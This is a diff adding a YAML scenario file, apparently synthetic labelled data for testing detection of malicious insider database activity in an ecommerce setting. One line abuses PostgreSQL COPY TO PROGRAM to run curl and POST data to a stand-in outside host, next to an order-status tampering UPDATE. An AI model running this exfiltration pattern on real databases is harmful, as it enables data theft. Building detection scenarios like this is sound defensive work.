@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_68_data_tamper_mal_2012
+family_id: gen_ecommerce_68_data_tamper_mal_fam2012
+domain: ecommerce
+time_of_day: 00:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: UPDATE orders SET status = 323854 WHERE order_id = 80542
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.24.1.141
+      port: 23
